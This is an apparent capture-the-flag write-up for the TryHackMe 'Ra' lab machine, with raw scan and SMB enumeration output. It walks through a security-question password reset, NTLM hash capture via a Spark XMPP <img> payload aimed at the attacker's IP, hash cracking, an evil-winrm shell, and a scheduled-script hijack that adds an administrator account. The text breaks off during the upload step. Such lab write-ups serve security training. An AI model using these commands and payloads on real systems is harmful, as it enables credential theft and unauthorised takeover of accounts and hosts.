 ```
 PORT     STATE SERVICE            VERSION
53/tcp   open  domain             Simple DNS Plus
80/tcp   open  http               Microsoft IIS httpd 10.0
|_http-title: Windcorp.
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec       Microsoft Windows Kerberos (server time: 2026-01-04 05:21:38Z)
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
389/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
2179/tcp open  vmrdp?
3268/tcp open  ldap               Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server      Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Not valid before: 2026-01-03T05:20:22
|_Not valid after:  2026-07-05T05:20:22
|_ssl-date: 2026-01-04T05:23:22+00:00; 0s from scanner time.
5222/tcp open  jabber             Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     compression_methods: 
|     auth_mechanisms: 
|     features: 
|     xmpp: 
|       version: 1.0
|     capabilities: 
|_    stream_id: 66kuo510bu
|_ssl-date: 2026-01-04T05:23:27+00:00; 0s from scanner time.
5269/tcp open  xmpp               Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     compression_methods: 
|     errors: 
|       (timeout)
|     features: 
|     xmpp: 
|     auth_mechanisms: 
|_    unknown: 
7070/tcp open  http               Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
7443/tcp open  ssl/http           Jetty 9.4.18.v20190429
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
7777/tcp open  socks5             (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9090/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
|_http-title: Site doesn't have a title (text/html).
9091/tcp open  ssl/http           Jetty
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00


Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-04T05:22:36
|_  start_date: N/A

 ```



 ChangeMe#1234

```
└─$ crackmapexec smb windcorp.thm -u lilyle -p 'ChangeMe#1234'  --shares
SMB         windcorp.thm    445    FIRE             [*] Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
SMB         windcorp.thm    445    FIRE             [+] windcorp.thm\lilyle:ChangeMe#1234 
SMB         windcorp.thm    445    FIRE             [+] Enumerated shares
SMB         windcorp.thm    445    FIRE             Share           Permissions     Remark
SMB         windcorp.thm    445    FIRE             -----           -----------     ------
SMB         windcorp.thm    445    FIRE             ADMIN$                          Remote Admin
SMB         windcorp.thm    445    FIRE             C$                              Default share
SMB         windcorp.thm    445    FIRE             IPC$            READ            Remote IPC
SMB         windcorp.thm    445    FIRE             NETLOGON        READ            Logon server share 
SMB         windcorp.thm    445    FIRE             Shared          READ            
SMB         windcorp.thm    445    FIRE             SYSVOL          READ            Logon server share 
SMB         windcorp.thm    445    FIRE             Users           READ            

-------------------------------------------------------------------------
┌──(kali㉿kali)-[~/tryhackme]
└─$ crackmapexec smb windcorp.thm -u lilyle -p 'ChangeMe#1234'  --pass-pol
SMB         windcorp.thm    445    FIRE             [*] Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
SMB         windcorp.thm    445    FIRE             [+] windcorp.thm\lilyle:ChangeMe#1234 
SMB         windcorp.thm    445    FIRE             [+] Dumping password info for domain: WINDCORP
SMB         windcorp.thm    445    FIRE             Minimum password length: 7
SMB         windcorp.thm    445    FIRE             Password history length: 24
SMB         windcorp.thm    445    FIRE             Maximum password age: 41 days 23 hours 53 minutes 
SMB         windcorp.thm    445    FIRE             
SMB         windcorp.thm    445    FIRE             Password Complexity Flags: 010001
SMB         windcorp.thm    445    FIRE                 Domain Refuse Password Change: 0
SMB         windcorp.thm    445    FIRE                 Domain Password Store Cleartext: 1
SMB         windcorp.thm    445    FIRE                 Domain Password Lockout Admins: 0
SMB         windcorp.thm    445    FIRE                 Domain Password No Clear Change: 0
SMB         windcorp.thm    445    FIRE                 Domain Password No Anon Change: 0
SMB         windcorp.thm    445    FIRE                 Domain Password Complex: 1
SMB         windcorp.thm    445    FIRE             
SMB         windcorp.thm    445    FIRE             Minimum password age: 1 day 4 minutes 
SMB         windcorp.thm    445    FIRE             Reset Account Lockout Counter: 2 minutes 
SMB         windcorp.thm    445    FIRE             Locked Account Duration: 2 minutes 
SMB         windcorp.thm    445    FIRE             Account Lockout Threshold: 5
SMB         windcorp.thm    445    FIRE             Forced Log off Time: Not Set
                                                                                                 
```

```
└─$ smbmap -u 'lilyle' -p 'ChangeMe#1234'  -H windcorp.thm  -r

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.64.136.128:445       Name: windcorp.thm              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        ./IPC$
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown
        fr--r--r--                6 Sun Dec 31 19:03:58 1600    lsass
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    scerpc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-248-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-2bc-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-564-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-73c-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-348-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-348-1
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    RpcProxy\49670
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    07c93646c137132a
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    RpcProxy\593
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    spoolss
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-b68-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    netdfs
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ROUTER
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-334-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.134119775836499439.3884.DefaultAppDomain.powershell
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-ca4-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    TermSrv_API_service
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    Ctx_WinStation_API_service
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    SessEnvPublicRpc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-17bc-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    iisipm29622189-9c6f-4c3e-aa8e-66c3d10fb17b
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    iislogpipe94a1c6ac-a3aa-4589-b04b-64ac8c2fa691
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.134119778375529052.1816.DefaultAppDomain.powershell
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.134119775820354846.3416.DefaultAppDomain.sme
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-c78-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    dotnet-diagnostic-2516
        NETLOGON                                                READ ONLY       Logon server share 
        ./NETLOGON
        dr--r--r--                0 Sat May  2 06:02:19 2020    .
        dr--r--r--                0 Sat May  2 06:02:19 2020    ..
        Shared                                                  READ ONLY
        ./Shared
        dr--r--r--                0 Fri May 29 20:45:42 2020    .
        dr--r--r--                0 Fri May 29 20:45:42 2020    ..
        fr--r--r--               45 Fri May  1 11:32:36 2020    Flag 1.txt
        fr--r--r--         29526628 Fri May 29 20:45:01 2020    spark_2_8_3.deb
        fr--r--r--         99555201 Sun May  3 07:08:39 2020    spark_2_8_3.dmg
        fr--r--r--         78765568 Sun May  3 07:08:39 2020    spark_2_8_3.exe
        fr--r--r--        123216290 Sun May  3 07:08:39 2020    spark_2_8_3.tar.gz
        SYSVOL                                                  READ ONLY       Logon server share 
        ./SYSVOL
        dr--r--r--                0 Sat May  2 06:02:20 2020    .
        dr--r--r--                0 Sat May  2 06:02:20 2020    ..
        dr--r--r--                0 Sat May  2 06:02:20 2020    NRznLVEcPj
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    windcorp.thm
        Users                                                   READ ONLY
        ./Users
        dw--w--w--                0 Sat May  2 18:05:58 2020    .
        dw--w--w--                0 Sat May  2 18:05:58 2020    ..
        dr--r--r--                0 Sun May 10 07:18:11 2020    Administrator
        dr--r--r--                0 Thu Apr 30 20:33:55 2020    All Users
        dr--r--r--                0 Fri May  1 09:09:44 2020    angrybird
        dr--r--r--                0 Fri May  1 09:09:34 2020    berg
        dr--r--r--                0 Fri May  1 09:09:22 2020    bluefrog579
        dr--r--r--                0 Sun May  3 09:30:02 2020    brittanycr
        dr--r--r--                0 Fri May  1 09:09:08 2020    brownostrich284
        dr--r--r--                0 Sun Jan  4 00:21:58 2026    buse
        dw--w--w--                0 Thu Apr 30 19:35:11 2020    Default
        dr--r--r--                0 Thu Apr 30 20:33:55 2020    Default User
        fr--r--r--              174 Thu Apr 30 20:31:55 2020    desktop.ini
        dr--r--r--                0 Fri May  1 09:08:54 2020    edward
        dr--r--r--                0 Sat May  2 19:30:16 2020    freddy
        dr--r--r--                0 Fri May  1 09:08:28 2020    garys
        dr--r--r--                0 Sun Jan  4 00:36:05 2026    goldencat416
        dr--r--r--                0 Fri May  1 09:08:17 2020    goldenwol
        dr--r--r--                0 Fri May  1 09:08:06 2020    happ
        dr--r--r--                0 Fri May  1 09:07:53 2020    happyme
        dr--r--r--                0 Fri May  1 09:07:42 2020    Luis
        dr--r--r--                0 Fri May  1 09:07:31 2020    orga
        dr--r--r--                0 Fri May  1 09:07:19 2020    organicf
        dr--r--r--                0 Sun Jan  4 00:31:59 2026    organicfish718
        dr--r--r--                0 Fri May  1 09:07:06 2020    pete
        dw--w--w--                0 Thu Apr 30 10:35:47 2020    Public
        dr--r--r--                0 Fri May  1 09:06:54 2020    purplecat
        dr--r--r--                0 Fri May  1 09:06:42 2020    purplepanda
        dr--r--r--                0 Fri May  1 09:06:31 2020    sadswan
        dr--r--r--                0 Sun Jan  4 00:35:23 2026    sadswan869
        dr--r--r--                0 Fri May  1 09:06:20 2020    sheela
        dr--r--r--                0 Fri May  1 09:05:39 2020    silver
        dr--r--r--                0 Fri May  1 09:05:24 2020    smallf
        dr--r--r--                0 Fri May  1 09:05:05 2020    spiff
        dr--r--r--                0 Fri May  1 09:04:49 2020    tinygoos
        dr--r--r--                0 Fri May  1 09:03:57 2020    whiteleopard

```

---
This writeup details the exploitation of the Ra machine on TryHackMe. The process involves web-based password resets, NTLM hash leaking via an XMPP vulnerability, and privilege escalation through a misconfigured PowerShell script.
1. Enumeration & Initial Access

An Nmap scan reveals several open ports, including 80 (HTTP), 445 (SMB), 3389 (RDP), and 5222 (XMPP/Openfire).
Web Reconnaissance

The web server on Port 80 hosts the Windcorp employee portal.

    Username Discovery: The "Staff" page lists several usernames, including lilyle (Lily Levesque).

    Password Reset: The portal has a "Reset Password" feature. Lily's security question asks for her pet's name.

    Information Leak: In the "Employees in Focus" section, an image of a dog is named Sparky.

    Exploitation: Using lilyle and the answer Sparky, we reset her password to ChangeMe#1234.

2. Foothold: Leaking NTLM Hashes

With lilyle’s credentials, we enumerate SMB shares.
Bash

crackmapexec smb 10.10.x.x -u lilyle -p 'ChangeMe#1234' --shares

Inside the Shared share, we find Spark 2.8.3 installation files. This version is vulnerable to CVE-2020-12772, where an <img> tag in a chat message forces the recipient to authenticate with their NTLM hash.

Capturing the Hash

    Start Responder: sudo responder -I tun0

    Send Payload: Using an XMPP client (like Pidgin) or a script, log in as lilyle and send a message to user buse:

        Payload: <img src="http://<YOUR_IP>/a.png">

    Hash Captured: Responder captures the NTLMv2 hash for WINDCORP\buse.

Cracking the Hash

Using John the Ripper:
Bash

john hash --wordlist=/usr/share/wordlists/rockyou.txt
# Result: buse : uzunLM+3131

3. Privilege Escalation

We gain a shell as buse using Evil-WinRM:
Bash

evil-winrm -i 10.10.x.x -u buse -p 'uzunLM+3131'

Account Operators Group

Checking group membership (whoami /all) reveals buse is in the Account Operators group. This allows us to reset passwords for non-administrative accounts.
Script Analysis

We find a script at C:\scripts\checkservers.ps1 that appears to be a scheduled task running as a high-privileged user. It attempts to read content from C:\Users\brittanycr\hosts.txt.
Hijacking the Execution Flow

    Reset Password: Reset brittanycr’s password since she owns the folder the script reads: net user brittanycr hello123#

    Create Payload: On Kali, create a hosts.txt file containing commands to create an admin: net user hacker Password123 /add; net localgroup Administrators hacker /add

    Upload Payload: Use smbclient to upload the file to brittanycr's directory:
    Bash

smbclient -U 'brittanycr' //10.10.x.x/Users
cd brittanycr -> put hosts.txt